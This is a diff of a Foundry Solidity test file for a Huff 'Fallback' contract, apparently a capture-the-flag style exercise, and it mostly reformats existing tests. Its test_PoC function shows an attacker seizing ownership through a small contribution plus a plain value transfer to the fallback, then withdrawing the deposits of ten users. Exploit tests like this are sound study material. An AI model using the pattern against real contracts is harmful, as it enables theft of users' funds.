@@ -1,7 +1,9 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
+
+import {Test} from "forge-std/Test.sol";
 
 import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";
 
@@ -28,8 +30,6 @@ contract FallbackTest is Test {
     error CallFailed();
 
     function setUp() public {
-
-        
         vm.deal(ALICE, 10 ether);
         vm.deal(BOB, 10 ether);
         vm.deal(CAROL, 10 ether);
@@ -65,7 +65,7 @@ contract FallbackTest is Test {
     }
 
     function test_contribute() public {
-      vm.deal(ATTACKER, 10000 ether);
+        vm.deal(ATTACKER, 10000 ether);
         vm.startPrank(ATTACKER);
 
         vm.expectRevert();
@@ -96,9 +96,9 @@ contract FallbackTest is Test {
         vm.startPrank(ATTACKER);
 
         vm.expectRevert();
-        (bool successFirst, ) = address(fallbackInterface).call{value: 0.003 ether}(
-            ""
-        );
+        (bool successFirst, ) = address(fallbackInterface).call{
+            value: 0.003 ether
+        }("");
         if (!successFirst) revert CallFailed();
 
         fallbackInterface.contribute{value: 0.002 ether}();
@@ -112,61 +112,108 @@ contract FallbackTest is Test {
     }
 
     function test_PoC() public {
-        console.log("FALLBACK'S OWNER (BEFORE ATTACK): ", fallbackInterface.owner());
-        console.log("FALLBACK'S BALANCE (BEFORE DEPOSITS): ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S OWNER (BEFORE ATTACK): ",
+            fallbackInterface.owner()
+        );
+        console.log(
+            "FALLBACK'S BALANCE (BEFORE DEPOSITS): ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(ALICE);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + ALICE'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + ALICE'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(BOB);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + BOB'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + BOB'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(CAROL);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + CAROL'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + CAROL'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(DAVE);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + DAVE'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + DAVE'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(EVE);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + EVE'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + EVE'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(FRED);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + FRED'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + FRED'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(GARY);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + GARY'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + GARY'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(HARRY);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + HARRY'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + HARRY'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(IAN);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + IAN'S DEPOSIT: ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + IAN'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
 
         vm.prank(JANE);
         fallbackInterface.contribute{value: 10 ether}();
-        console.log("FALLBACK'S BALANCE + JANE'S DEPOSIT: ", address(fallbackInterface).balance);
-        
-        console.log("FALLBACK'S BALANCE (AFTER DEPOSITS): ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S BALANCE + JANE'S DEPOSIT: ",
+            address(fallbackInterface).balance
+        );
+
+        console.log(
+            "FALLBACK'S BALANCE (AFTER DEPOSITS): ",
+            address(fallbackInterface).balance
+        );
 
         vm.startPrank(ATTACKER);
 
         fallbackInterface.contribute{value: 0.002 ether}();
-        (bool success, ) = address(fallbackInterface).call{value: 0.001 ether}("");
+        (bool success, ) = address(fallbackInterface).call{value: 0.001 ether}(
+            ""
+        );
         if (!success) revert CallFailed();
         fallbackInterface.withdraw();
         vm.stopPrank();
 
-        console.log("FALLBACK'S OWNER (AFTER ATTACK): ", fallbackInterface.owner());
-        console.log("FALLBACK'S BALANCE (AFTER ATTACK): ", address(fallbackInterface).balance);
+        console.log(
+            "FALLBACK'S OWNER (AFTER ATTACK): ",
+            fallbackInterface.owner()
+        );
+        console.log(
+            "FALLBACK'S BALANCE (AFTER ATTACK): ",
+            address(fallbackInterface).balance
+        );
         console.log("ATTACKER'S BALANCE (AFTER ATTACK): ", ATTACKER.balance);
     }
 }
